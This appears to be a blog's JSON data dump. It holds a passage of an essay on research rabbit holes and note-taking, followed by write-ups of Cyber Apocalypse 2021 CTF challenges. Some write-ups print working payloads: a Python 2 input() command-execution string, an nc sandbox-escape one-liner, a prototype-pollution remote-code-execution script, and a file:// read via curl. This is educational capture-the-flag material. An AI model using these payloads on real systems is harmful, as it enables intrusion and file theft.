start reading it. In the text you find something you need to know more about, so you click on the little blue text to learn more. On the new article, you do the same. And after a while, you\'re deep in a rabbit hole, gasping for air, your head pounding from the sounds of collapsing walls of dirt around you. And you don\'t even remember where you started from. Not that it doesn\'t feel good to learn so many new things, but you\'ve completely diverged from your original research goal.\\n\\nBut what if instead, on the 5th article you went down to, you found a link to the original article you opened Wikipedia for? That would be awesome! You have now completed your first contextual circle! The rabbit hole just circled you back to your original path. You have validated your research, learned quite a few new things, and have returned to where you left off, able to continue on your merry path to enlightenment.\\n\\nAlso, the probability of this happening while researching on Google is close to none.\\n\\n## Conclusion\\n\\nThe lack of **stored context** in the exploration phase is what makes it impossible to remember the _relevant_ information during the collection or creation phases. No context means no way to connect separate information nuggets to a given concept, idea or subject. The brain simply dismisses it as irrelevant, and slowly gets rid of the memory.\\n\\nSadly, your typical browser interface doesn\'t really allow for visualising these complex non-linear interactions in lines of thought. This problem of the world-wide Web is something I believe [Douglas Engelbart](https://en.wikipedia.org/wiki/Douglas_Engelbart) was fully aware of, and was unhappy about. But sadly it\'s a fundamental issue. I would love to get deeper into it, and even look for a solution. But to my knowledge, the only realistic way to avoid this decontextualised thought pattern in online research is manually creating a knowledge map of your own research.\\n\\nAnd the manual solution reads something like this:\\n\\n1. During the exporation phase, don\'t worry about going down rabbit holes, but keep track of the context in which you discover information. The browser history might be useless in this scenario, but storing links with short descriptions or with the relevant search terms might be a useful manual step.\\n2. In the collection phase, take notes by having in mind the graphical representation of your knowledge. Your research can lead you to the following lines of thought:\\n\\n  * diverge from the core subject, and never come back\\n  * diverge and wrap around to the core line of thought\\n  * diverge and join in with another divergent line of thought (could still be useful in the context of serendepity)\\n\\nAs far as tools are concerned, you can discover what works best for you, but I recommend a note-taking tool which can create graphs of your knowledge map. It\'s so much better, when you can create an overview of interconnecting nuggets of knowledge, and see the context from a bird\'s perspective.\\n\\nHaving different information nuggets stored in an app also allows for their reuse, facilitating **contextual serendipity**. A concept I would like to discuss further as well.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"key-mission-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/key-mission-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-30-08:55:28key-mission-cyberapocalypse-2021-ctf.md","title":"Key Mission - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Key Mission challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Forensics.","date":"2021-04-30T00:00:00.000Z","formattedDate":"April 30, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":4.635,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"key-mission-cyberapocalypse-2021-ctf","title":"Key Mission - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Key Mission challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Forensics.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"How to remember what I was reading about?","permalink":"/blog/how-to-remember-what-i-was-reading-about"},"nextItem":{"title":"Input as a Service - Cyberapocalypse 2021 CTF","permalink":"/blog/input-as-a-service-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Key Mission challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Forensics.\\n\\n### Prompt\\n\\nThe secretary of earth defense has been kidnapped. We have sent our elite team on the enemy\'s base to find his location. Our team only managed to intercept this traffic. Your mission is to retrieve secretary\'s hidden location.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe\'re supplied with a Wireshark `.pcap` file, which seems to be filled with packets coming from an USB interface.\\n\\n```\\nNo.\\tTime\\tSource\\tDestination\\tProtocol\\tLength\\tInfo\\n1151\\t244.436586\\t3.2.1\\thost\\tUSB\\t72\\tURB_INTERRUPT in\\n1152\\t244.436609\\thost\\t3.2.1\\tUSB\\t64\\tURB_INTERRUPT in\\n```\\n\\nWe\'re particularly interested in the ones coming from Source `3.2.1`, since they hold additional data in the form of 8 more bytes at the end of the packet data:\\n\\n```\\n0000   c0 46 bd 04 55 8c ff ff 43 01 81 02 03 00 2d 00   \xc0F\xbd.U.\xff\xffC.....-.\\n0010   72 22 7f 60 00 00 00 00 d7 4c 0b 00 00 00 00 00   r\\".`....\xd7L......\\n0020   08 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00   ................\\n0030   01 00 00 00 00 00 00 00 04 02 00 00 00 00 00 00   ................\\n0040   02 00 2d 00 00 00 00 00                           ..-.....\\n```\\n\\nIn particular, we will be interested in the bytes which are 8th and 6th counting from the end, in this case `02` and `2d` respectively.\\n\\n### Analysis\\n\\nFrom the name of the challenge, we can assume that we will be analysing a keyboard being used for typing. If we scroll around the packets in Wireshark, we will notice that the one byte which always changes is the 6th one from the end.\\n\\nIf we look up keyboard mappings, we will find [this cool documentation](https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf) online for Usage tables of Human interface devices, which holds information on which byte codes mean what. For example, we can find that our `2d` byte from above means the symbol `-` (hyphen) or underscore `_`.\\n\\nThis is where we come at a difficulty, because even though we have information that the shift key is supposedly sent as byte `E1`, this is not how it\'s used in our pcap file.\\n\\nInitially I ignored this, and got a flag which didn\'t get accepted. It brought me to some frustration, but I kept digging until I found [this repo](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser) on GitHub, in which the creator handled the _shift_ key in another way.\\n\\nNamely, he took the `0x40`-th byte (or 8th counting from the end) from the packet data, and if it was a `02` or a `20`, that would mean that the (left or right) shift key is pressed.\\n\\nAt this point, we can just use that script, and get our flag, but I wanted to do it with my own script, which was 95% working at this point.\\n\\n### Solution\\n\\nApplying everything we learned, we can go ahead and\\n\\n1. Take the mappings from the pdf documentation, and create a dictionary of hex -> key value pairs.\\n2. Write a script which loads the `pcap` file, using `scapy` for example.\\n3. Read the 6th and 8th bytes counting from the end of each packet data.\\n4. Use the 8th byte to detect `Shift` presses.\\n5. Use the 6th byte to determine the symbol being typed.\\n6. String it all together (we can also handle backspace by removing the last element from our string).\\n\\n```python\\n#!/usr/bin/env python3\\n\\nfrom scapy.all import *\\nimport sys\\n\\nmapping_shift = {\\n  0x02: \'<Shift>\',\\n  0x20: \'<RShift>\'\\n}\\n\\nmapping = {\\n  0x00: [\\"\\", \\"\\"],\\n  0x01: [\\"ErrorRollOver\\", \\"ErrorRollOver\\"],\\n  0x02: [\\"POSTFail9\\", \\"POSTFail9\\"],\\n  0x03: [\\"ErrorUndefined\\", \\"ErrorUndefined\\"],\\n  0x04: [\\"a\\", \\"A\\"],\\n  0x05: [\\"b\\", \\"B\\"],\\n  0x06: [\\"c\\", \\"C\\"],\\n  0x07: [\\"d\\", \\"D\\"],\\n  0x08: [\\"e\\", \\"E\\"],\\n  0x09: [\\"f\\", \\"F\\"],\\n  0x0A: [\\"g\\", \\"G\\"],\\n  0x0B: [\\"h\\", \\"H\\"],\\n  0x0C: [\\"i\\", \\"I\\"],\\n  0x0D: [\\"j\\", \\"J\\"],\\n  0x0E: [\\"k\\", \\"K\\"],\\n  0x0F: [\\"l\\", \\"L\\"],\\n  0x10: [\\"m\\", \\"M\\"],\\n  0x11: [\\"n\\", \\"N\\"],\\n  0x12: [\\"o\\", \\"O\\"],\\n  0x13: [\\"p\\", \\"P\\"],\\n  0x14: [\\"q\\", \\"Q\\"],\\n  0x15: [\\"r\\", \\"R\\"],\\n  0x16: [\\"s\\", \\"S\\"],\\n  0x17: [\\"t\\", \\"T\\"],\\n  0x18: [\\"u\\", \\"U\\"],\\n  0x19: [\\"v\\", \\"V\\"],\\n  0x1A: [\\"w\\", \\"W\\"],\\n  0x1B: [\\"x\\", \\"X\\"],\\n  0x1C: [\\"y\\", \\"Y\\"],\\n  0x1D: [\\"z\\", \\"Z\\"],\\n  0x1E: [\\"1\\", \\"!\\"],\\n  0x1F: [\\"2\\", \\"@\\"],\\n  0x20: [\\"3\\", \\"#\\"],\\n  0x21: [\\"4\\", \\"$\\"],\\n  0x22: [\\"5\\", \\"%\\"],\\n  0x23: [\\"6\\", \\"^\\"],\\n  0x24: [\\"7\\", \\"&\\"],\\n  0x25: [\\"8\\", \\"*\\"],\\n  0x26: [\\"9\\", \\"(\\"],\\n  0x27: [\\"0\\", \\")\\"],\\n  0x28: [\\"Return\\", \\"Return\\"],\\n  0x29: [\\"ESCAPE\\", \\"ESCAPE\\"],\\n  0x2A: [\\"<BACKSPACE>\\", \\"<BACKSPACE>\\"],\\n  0x2B: [\\"Tab\\", \\"Tab\\"],\\n  0x2C: [\\" \\", \\" \\"],\\n  # 0x2C: \\"Spacebar\\",\\n  0x2D: [\\"-\\", \\"_\\"],\\n  0x2E: [\\"=\\", \\"+\\"],\\n  0x2F: [\\"[\\", \\"{\\"],\\n  0x30: [\\"]\\", \\"}\\"],\\n  0x31: [\\"\\\\\\\\\\", \\"|\\"],\\n  0x32: [\\"Non-US\\"],\\n  0x33: [\\";\\", \\":\\"],\\n  0x34: [\\"\u2018\\", \\"\\\\\\"\\"],\\n  0x35: [\\"Grave\\"],\\n  0x36: [\\",\\", \\"<\\"],\\n  0x37: [\\".\\", \\">\\"],\\n  0x38: [\\"/\\", \\"?\\"]\\n  # [OMITTED REST OF CODES FOR BREVITY]\\n}\\n\\ntry:\\n  packets = rdpcap(sys.argv[1])\\n  print(packets)\\nexcept:\\n  print(\'needs a pcap file supplied\')\\n  exit(-1)\\n\\nresult = \'\'\\nfor packet in packets:\\n  shift_byte = packet[0].load[-8]\\n  shift_key = 0\\n\\n  if shift_byte in mapping_shift:\\n    shift_key = 1\\n\\n  normal_byte = packet[0].load[-6]\\n  stringed = mapping[normal_byte][shift_key]\\n\\n  if stringed == mapping[0x2A][0]:\\n    # if backspace, remove one\\n    result = result[:-1]\\n  else:\\n    result += stringed\\n\\nprint(result)\\n```\\n\\nAnd, with this we can get the message being sent by our secret agent:\\n\\n```\\npython3 get_flag.py key_mission.pcap \\nWARNING: PcapReader: unknown LL type [220]/[0xdc]. Using Raw packets\\n<key_mission.pcap: TCP:0 UDP:0 ICMP:0 Other:1192>\\nI am sending secretary\u2018s location over this totally encrypted channel to make sure no one else will be able to read it except of us. This information is confidential and must not be shared with anyone else. The secretary\u2018s hidden location is CHTB{a_plac3_fAr_fAr_away_fr0m_earth}\\n```\\n\\nWith the flag now in plain sight\\n\\n```\\nCHTB{a_plac3_fAr_fAr_away_fr0m_earth}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"input-as-a-service-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/input-as-a-service-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-30-09:48:38input-as-a-service-cyberapocalypse-2021-ctf.md","title":"Input as a Service - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Input as a Service challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Misc.","date":"2021-04-30T00:00:00.000Z","formattedDate":"April 30, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":1.72,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"input-as-a-service-cyberapocalypse-2021-ctf","title":"Input as a Service - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Input as a Service challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Misc.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Key Mission - Cyberapocalypse 2021 CTF","permalink":"/blog/key-mission-cyberapocalypse-2021-ctf"},"nextItem":{"title":"BlitzProp - Cyberapocalypse 2021 CTF","permalink":"/blog/blitzprop-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Input as a Service challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Misc.\\n\\n### Prompt\\n\\nIn order to blend with the extraterrestrials, we need to talk and sound like them. Try some phrases in order to check if you can make them believe you are one of them.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe can netcat to a service at some address given to us. Upon doing so, we are prompted by the question _\\"Do you sound like an alien?\\"_, followed by what looks like a python prompt\\n\\n```\\nDo you sound like an alien?\\n>>>\\n```\\n\\nIf we supply it something random, it will spit out a python error trace.\\n\\n```\\nDo you sound like an alien?\\n>>> lolwut\\n\\n\\nTraceback (most recent call last):\\n  File \\"input_as_a_service.py\\", line 16, in <module>\\n    main()\\n  File \\"input_as_a_service.py\\", line 12, in main\\n    text = input(\' \')\\n  File \\"<string>\\", line 1, in <module>\\nNameError: name \'lolwut\' is not defined\\n```\\n\\n### Analysis\\n\\nWe see in the traceback, that we\'re supplying info to an `input` function inside of python2.x. This method has a well known vulnerability, which is that it tries to run the value of `input()` as code.\\n\\nWe can easily make use of that, and see if we can\'t invoke the `os` module of python, and maybe do some filesystem recon. We can do that by sending the following line into the input\\n\\n```python\\n__import__(\\"os\\").system(\\"ls\\")\\n```\\n\\nAnd we will see, that one of the files is indeed `flag.txt`.\\n\\n### Solution\\n\\nWe can go as complicated as we like, but the most straightforward way to solve this particular challenge, is to invoke the `os` module of python, and try to run `cat` on the file we found `flag.txt`.\\n\\n```python\\n[GCC 9.3.0]\\nDo you sound like an alien?\\n>>>\\n\\n __import__(\'os\').system(\'cat flag.txt\')\\nCHTB{4li3n5_us3_pyth0n2.X?!}\\n0\\n```\\n\\nAnd so, we get the flag\\n\\n```\\nCHTB{4li3n5_us3_pyth0n2.X?!}\\n```\\n\\nI\'ll throw the following line here as well, for reference\\n\\n```python\\necho \'int(().__class__.__base__.__subclasses__()[40](\\"flag.txt\\",\\"r\\").read())\' | nc 188.166.145.178 31960 | grep -o CHTB{.*} --color=none\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"blitzprop-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/blitzprop-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-30-10:45:31blitzprop-cyberapocalypse-2021-ctf.md","title":"BlitzProp - Cyberapocalypse 2021 CTF","description":"This is a writeup for the BlitzProp challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-30T00:00:00.000Z","formattedDate":"April 30, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.095,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"blitzprop-cyberapocalypse-2021-ctf","title":"BlitzProp - Cyberapocalypse 2021 CTF","description":"This is a writeup for the BlitzProp challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Input as a Service - Cyberapocalypse 2021 CTF","permalink":"/blog/input-as-a-service-cyberapocalypse-2021-ctf"},"nextItem":{"title":"CaaS - Cyberapocalypse 2021 CTF","permalink":"/blog/caas-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the BlitzProp challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n### Prompt\\n\\nA tribute page for the legendary alien band called BlitzProp!\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe\'re provided with the source code for a cute webpage, which allows us to vote for some song names using an input field.\\n\\nBy looking at the song names we\'re supposed to vote for, we could potentially notice some hints like **Polluting** and **AST**.\\n\\nThe site seems to be running on a `node` environment with an `express` server, so we can check out the routes handling file.\\n\\n```js\\nconst path              = require(\'path\');\\nconst express           = require(\'express\');\\nconst pug               = require(\'pug\');\\nconst { unflatten }     = require(\'flat\');\\nconst router            = express.Router();\\n\\nrouter.get(\'/\', (req, res) => {\\n    return res.sendFile(path.resolve(\'views/index.html\'));\\n});\\n\\nrouter.post(\'/api/submit\', (req, res) => {\\n    const { song } = unflatten(req.body);\\n\\n\\t\\tconsole.log(req.body)\\n\\t\\tconsole.log(unflatten(req.body))\\n\\n\\tif (song.name.includes(\'Not Polluting with the boys\') || song.name.includes(\'ASTa la vista baby\') || song.name.includes(\'The Galactic Rhymes\') || song.name.includes(\'The Goose went wild\')) {\\n\\t\\treturn res.json({\\n\\t\\t\\t\'response\': pug.compile(\'span Hello #{user}, thank you for letting us know!\')({ user:\'guest\' })\\n\\t\\t});\\n\\t} else {\\n\\t\\treturn res.json({\\n\\t\\t\\t\'response\': \'Please provide us with the name of an existing song.\'\\n\\t\\t});\\n\\t}\\n});\\n\\nmodule.exports = router;\\n```\\n\\nLooking closely, we see that the `/api/submit` POST endpoint uses a module called `flat` to unflatten a request body into json. The code also uses `pug` for templating.\\n\\nWe can check the versions of these libraries in the `package.json` file.\\n\\n```json\\n\\"dependencies\\": {\\n    \\"express\\": \\"^4.17.1\\",\\n    \\"flat\\": \\"5.0.0\\",\\n    \\"pug\\": \\"^3.0.0\\"\\n}\\n```\\n\\nThe version of flat used seems to be vulnerable to prototype pollution, and we can find information on the payloads we can use [here](https://blog.p6.is/AST-Injection/#Example-1), finding an example exploiting `pug`.\\n\\n### Solution\\n\\nBy having the exploit at hand, we can write a simple script which will send a POST request with the required `song.name` in the data, as well as with our payload.\\n\\nThe payload itself will allow us to do _Remote Code Execution_. More to the point, we will cat the flag file into the publically available `/static/js` folder, so we can navigate to it after the pollution exploit.\\n\\n```python\\nimport requests\\n\\nTARGET_URL = \'http://46.101.44.190:32262\'\\n\\n# make pollution\\nr=requests.post(TARGET_URL + \'/api/submit\', json = {\\n    \\"song.name\\":\\"The Goose went wild\\",\\n    \\"__proto__.block\\": {\\n        \\"type\\": \\"Text\\", \\n        \\"line\\": \\"process.mainModule.require(\'child_process\').execSync(\'cat flag* > static/js/main.js\')\\"\\n    }\\n})\\n# execute\\nrequests.get(TARGET_URL)\\nprint(r.text)\\n```\\n\\nNow that we have executed our command, we simply go ahead and curl that flag file, and find our flag\\n\\n```\\nCHTB{p0llute_with_styl3}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"caas-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/caas-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-30-10:57:16caas-cyberapocalypse-2021-ctf.md","title":"CaaS - Cyberapocalypse 2021 CTF","description":"This is a writeup for the CaaS challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-30T00:00:00.000Z","formattedDate":"April 30, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":1.445,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"caas-cyberapocalypse-2021-ctf","title":"CaaS - Cyberapocalypse 2021 CTF","description":"This is a writeup for the CaaS challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"BlitzProp - Cyberapocalypse 2021 CTF","permalink":"/blog/blitzprop-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Cyber Apocalypse 2021 Capture the Flag Write-ups","permalink":"/blog/cyber-apocalypse-2021-capture-the-flag-write-ups"}},"content":"This is a writeup for the CaaS challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n### Prompt\\n\\ncURL As A Service or CAAS is a brand new Alien application, built so that humans can test the status of their websites. However, it seems that the Aliens have not quite got the hang of Human programming and the application is riddled with issues.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe are given the source code for a site. The site itself seems to be simply a frontend for executing `curl` on the host machine. If we so desire, we can look into the source code for more details.\\n\\n`index.php` tells us that there exists a POST endpoint `/api/curl`, which takes our host to run curl on as data.\\n\\n```php\\n[REDACTED]\\n\\n$router = new Router();\\n$router->new(\'GET\', \'/\', \'[email protected]\');\\n$router->new(\'POST\', \'/api/curl\', \'[email protected]\' );\\n\\n[REDACTED]\\n```\\n\\nWe also get some information on how that works inside the  `controllers/CurlController.php` file\\n\\n```php\\n<?php\\nclass CurlController\\n{\\n    public function index($router)\\n    {\\n        return $router->view(\'index\');\\n    }\\n\\n    public function execute($router)\\n    {\\n        $url = $_POST[\'ip\'];\\n\\n        if (isset($url)) {\\n            $command = new CommandModel($url);\\n            return json_encode([ \'message\' => $command->exec() ]);\\n        }\\n    }\\n}\\n```\\n\\nand inside `models/CommandModel.php`\\n\\n```php\\n<?php\\nclass CommandModel\\n{\\n    public function __construct($url)\\n    {\\n        $this->command = \\"curl -sL \\" . escapeshellcmd($url);\\n    }\\n\\n    public function exec()\\n    {\\n        exec($this->command, $output);\\n        return $output;\\n    }\\n}\\n```\\n\\nAll of this simply makes us certain that we have to exploit `curl`.\\n\\nSolution The solution is quite simple, once we realise that we can curl for files inside a file system using `file://`.\\n\\nWith this in mind, we simply send `file:///flag` to our POST endpoint at `/api/curl` , and immediately get the flag\\n\\n```\\nCHTB{f1le_r3trieval_4s_a_s3rv1ce}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"cyber-apocalypse-2021-capture-the-flag-write-ups","metadata":{"permalink":"/blog/cyber-apocalypse-2021-capture-the-flag-write-ups","source":"@site/blog/2021-04-30-10:58:36cyber-apocalypse-2021-capture-the-flag-write-ups.md","title":"Cyber Apocalypse 2021 Capture the Flag Write-ups","description":"A collection of write-ups for challenges from the Cyber Apocalypse 2021 CTF finished by Kiril Blagoev.","date":"2021-04-30T00:00:00.000Z","formattedDate":"April 30, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":3.005,"hasTruncateMarker":false,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"cyber-apocalypse-2021-capture-the-flag-write-ups","title":"Cyber Apocalypse 2021 Capture the Flag Write-ups","description":"A collection of write-ups for challenges from the Cyber Apocalypse 2021 CTF finished by Kiril Blagoev.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"CaaS - Cyberapocalypse 2021 CTF","permalink":"/blog/caas-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Alien Camp - Cyberapocalypse 2021 CTF","permalink":"/blog/alien-camp-cyberapocalypse-2021-ctf"}},"content":"Well, here we go. This was the very first CTF event that I took part of while it was happening, and I\'m quite proud of my results!\\n\\nMost importantly, almost every challenge that I finished taught me a bunch of new concepts and techniques, and showcased what can be expected in the field of hunting vulnerabilities.\\n\\nBy the end of the 5-day ordeal I got to 357th place out of 4740 teams and more than 9500 players, and I\'m very satisfied with such an outcome from my very first event of this type.\\n\\nBut, as I can now see, the learning process continues even after the event, in the form of writing write-ups! The much more level-headed approach of trying to explain and follow the process of finding the flags means that I get to see my ideas and techniques in a new light, and organise the tools and concepts much better.\\n\\nReading write-ups is also indisplensable, as there were quite a few other challenges that I was sure I was very near to solving, but never found out what I was missing. Reading other people\'s write-ups allowed me to see what I was did right or wrong, and how to improve on that.\\n\\nSo I hope you get that from reading these write-ups as well, and learn a few things from them, or at least see an another approach to solving the same problem.\\n\\n**Enjoy!**\\n\\n## Category Web\\n\\n[Inspector Gadget - Cyberapocalypse 2021 CTF](/blog/inspector-gadget-cyberapocalypse-2021-ctf/)\\n\\nAn easy warm-up challenge in the style of a scavenger hunt\\n\\n[CaaS - Cyberapocalypse 2021 CTF](/blog/caas-cyberapocalypse-2021-ctf/)\\n\\nExploiting curl running locally on the host, to get local file inclusion\\n\\n[miniSTRypalace - Cyberapocalypse 2021 CTF](/blog/ministrypalace-cyberapocalypse-2021-ctf/)\\n\\nShowcasing the importance of white-listing instead of black-listing commands and strings inside PHP\\n\\n[BlitzProp - Cyberapocalypse 2021 CTF](/blog/blitzprop-cyberapocalypse-2021-ctf/)\\n\\nExploring the interesting concept ot AST injection and prototype pollution, resulting in remote code exectution. And all of that because we use the wrong version of a library in node\\n\\n[E.Tree - Cyberapocalypse 2021 CTF](/blog/e-tree-cyberapocalypse-2021-ctf/)\\n\\nBlind XPATH injection with a slight twist\\n\\n[Wild goose hunt - Cyberapocalypse 2021 CTF](/blog/wild-goose-hunt-cyberapocalypse-2021-ctf/)\\n\\nA challenge showcasing the weakness of improper handling of mongo queries\\n\\n[Emoji Voting - Cyberapocalypse 2021 CTF](/blog/emoji-voting-cyberapocalypse-2021-ctf/)\\n\\nThis fun challenge showcases blind SQL injection inside of an ORDER BY clause\\n\\n## Category Reverse\\n\\n[Passphrase - Cyberapocalypse 2021 CTF](/blog/passphrase-cyberapocalypse-2021-ctf/)\\n\\nA simple reverse-engineering challenge invoving stringcompare\\n\\n[Authenticator - Cyberapocalypse 2021 CTF](/blog/authenticator-cyberapocalypse-2021-ctf/)\\n\\nReverse-engineering a binary, involving both stringcompare and a bit of XOR magic\\n\\n## Category Forensics\\n\\n[Key Mission - Cyberapocalypse 2021 CTF](/blog/key-mission-cyberapocalypse-2021-ctf/)\\n\\nHaving fun with USB Human Interface Devices, namely a keyboard. The twist was having to deal with the Shift key\\n\\n## Category Crypto\\n\\n[Nintendo Base64 - Cyberapocalypse 2021 CTF](/blog/nintendo-base64-cyberapocalypse-2021-ctf/)\\n\\nAn easy warm-up cryptography challenge, dealing with multilayered base64 encoding and obfuscation\\n\\n[Soulcrabber - Cyberapocalypse 2021 CTF](/blog/soulcrabber-cyberapocalypse-2021-ctf/)\\n\\nA challenge written in Rust, showcasing using known seeds for pseudo-random number generators\\n\\n[Phasestream 1- Cyberapocalypse 2021 CTF](/blog/phasestream-1-cyberapocalypse-2021-ctf/)\\n\\nThe first challenge of this series showcased XOR encryption with a 5-byte key\\n\\n[Phasestream 2 - Cyberapocalypse 2021 CTF](/blog/phasestream-2-cyberapocalypse-2021-ctf/)\\n\\nStill on the topic of XOR, this time using a 1-byte key, but hiding the real flag in a list of 9999 different strings\\n\\n[Phasestream 3 - Cyberapocalypse 2021 CTF](/blog/phasestream-3-cyberapocalypse-2021-ctf/)\\n\\nA challenge showcasing the devastating effects of reusing keystreams in AES encryption\\n\\n[Phasestream 4 - Cyberapocalypse 2021 CTF](/blog/phasestream-4-cyberapocalypse-2021-ctf/)\\n\\nA direct follow-up of the previous challenge, introducing a bit of a guessing game\\n\\n## Category Misc\\n\\n[Alien Camp - Cyberapocalypse 2021 CTF](/blog/alien-camp-cyberapocalypse-2021-ctf/)\\n\\nA fun scripting challenge involving the automatic handling of `nc` based services\\n\\n[Input as a Service - Cyberapocalypse 2021 CTF](/blog/input-as-a-service-cyberapocalypse-2021-ctf/)\\n\\n`input()` in python2.x is scary by default\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"alien-camp-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/alien-camp-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-29-14:00:49alien-camp-cyberapocalypse-2021-ctf.md","title":"Alien Camp - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Alien Camp challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Misc.","date":"2021-04-29T00:00:00.000Z","formattedDate":"April 29, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":2.575,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"alien-camp-cyberapocalypse-2021-ctf","title":"Alien Camp - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Alien Camp challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Misc.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Cyber Apocalypse 2021 Capture the Flag Write-ups","permalink":"/blog/cyber-apocalypse-2021-capture-the-flag-write-ups"},"nextItem":{"title":"Authenticator - Cyberapocalypse 2021 CTF","permalink":"/blog/authenticator-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Alien Camp challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Misc.\\n\\n### Prompt\\n\\nThe Ministry of Galactic Defense now accepts human applicants for their specialised warrior unit, in exchange for their debt to be erased. We do not want to subject our people to this training and to be used as pawns in their little games. We need you to answer 500 of their questions to pass their test and take them down from the inside.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe\'re given a box to which we can connect with `netcat`. On this machine, there\'s a service which has two options:\\n\\n1. Choosing option 1 will give us a list of numbers associated with emojis.\\n2. Choosing option 2 starts an exam, in which we need to supply the answer to 500 arithmetic problems. The only catch is, that the numbers in the equations are represented with the emojis from option 1.\\n\\nAdditionally, every time we connect we will have a different set of emoji -> number dictionary entries.\\n\\nIf we try to manually translate the emojis into numbers, and then supply the answer to an equation, we will be (likely) told that we\'re too slow.\\n\\n### Solution\\n\\nTherefore, we need to automate the process. The solution will contain the following steps:\\n\\n1. Once connected, we will check the emoji -> number relation in option 1, and record it into a dictionary.\\n2. We then start the exam.\\n3. Once supplied with an equation, we do some string manipulation to extract the emojis and arithmetic operations, 